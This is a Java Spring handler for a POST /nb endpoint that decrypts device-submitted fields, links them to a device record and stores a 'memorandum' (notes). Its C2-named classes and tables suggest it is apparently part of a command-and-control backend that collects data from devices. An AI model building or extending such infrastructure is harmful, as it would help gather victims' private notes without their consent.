package com.consume.service.handlers;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Component;
import org.springframework.transaction.annotation.Propagation;
import org.springframework.transaction.annotation.Transactional;

import com.consume.service.C2BusinessStore;
import com.consume.service.C2HandlerContext;
import com.consume.service.AbstractC2Handler;

/**
 * POST /nb：备忘录（XADD.md §5.5）。
 *
 * 解密 → save_event_decrypt → save_memorandum → 关联 c2_records.device_id。
 */
@Component
public class HandleNb extends AbstractC2Handler {

    @Autowired
    private C2BusinessStore store;

    @Override
    public String path() {
        return "/nb";
    }

    @Override
    @Transactional(propagation = Propagation.REQUIRES_NEW, rollbackFor = Exception.class)
    public void handle(C2HandlerContext ctx) throws Exception {
        if (!"POST".equalsIgnoreCase(ctx.getMethod())) {
            log.info("正常日志:[c2_handlers] /nb 非 POST，跳过, id={}", ctx.getRecordId());
            return;
        }
        resolveDomain(ctx);
        String plain = decrypt(ctx, "list", "d", "f", "u");

        if (plain.isEmpty()) {
            log.info("异常日志:[c2_handlers] /nb 解密失败，跳过业务, id={}", ctx.getRecordId());
            store.saveEventDecrypt(ctx, plain, ctx.getKeyLabel());
            return;
        }

        String d = ctx.plaintextStr("d");
        String f = ctx.plaintextStr("f");
        String u = ctx.plaintextStr("u");
        Long rowId = deviceResolver.resolveAndLink(ctx, d, f, u, null, null);

        store.saveEventDecrypt(ctx, plain, ctx.getKeyLabel());
        if (rowId == null) {
            log.info("异常日志:[c2_handlers] /nb 无设备 rowId，跳过 memorandum, id={}, deviceid={}",
                    ctx.getRecordId(), ctx.getDeviceId());
            return;
        }
        store.saveMemorandum(ctx, ctx.getPlaintext());

        log.debug("正常日志:[c2_handlers] call handle_nb 完成, id={}, deviceRowId={}, deviceid={}",
                ctx.getRecordId(), ctx.getDeviceRowId(), ctx.getDeviceId());
    }
}
